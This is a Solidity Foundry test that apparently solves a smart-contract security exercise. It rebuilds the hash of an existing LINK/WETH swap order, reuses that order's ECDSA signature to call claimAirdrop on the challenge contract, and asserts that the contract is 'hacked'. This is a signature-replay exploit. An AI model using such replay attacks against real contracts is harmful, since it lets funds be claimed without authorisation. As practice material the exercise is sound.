// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Week22Exercise4.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract Week22Exercise4Test is Test {
    using ECDSA for bytes32;

    Week22Exercise4 public challenge;

    function setUp() public {
        challenge = new Week22Exercise4();
    }

    function testClaimAirdrop() public {
        uint8 v = 28;
        bytes32 r = 0x6b0183bfa2c9505e9f9910f2afcc39d4e3f837cc3d633a341a0bd5a70c36e824;
        bytes32 s = 0x3ba6f084d0d457b7eb70c8030b560a794c32efe66f4aa37f3650a037c39ce2e9;

        bytes memory signature = abi.encodePacked(r, s, v);

        // Build the full hash with all components
        address makerToken = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK
        address takerToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
        uint128 makerAmount = 1060890206242426112;
        uint128 takerAmount = 8000000000000000;
        address maker = 0x51C72848c68a965f66FA7a88855F9f7784502a7F;
        address taker = address(0); // 0x000…000
        address txOrigin = 0xB1700C08Aa433b319dEF2b4bB31d6De5C8512D96;
        uint256 expiryAndNonce = 10886526068462383168360643479118387805249052861268501963701911268754;

        bytes32 hash = keccak256(
            abi.encode(
                makerToken,
                takerToken,
                makerAmount,
                takerAmount,
                maker,
                taker,
                txOrigin,
                expiryAndNonce
            )
        );

        // Optional: Ethereum Signed Message prefix, if the signer added it
        // hash = hash.toEthSignedMessageHash(); // uncomment if that was used during signing

        challenge.claimAirdrop(1 ether, hash, signature);

        assertTrue(challenge.hacked());
    }
}
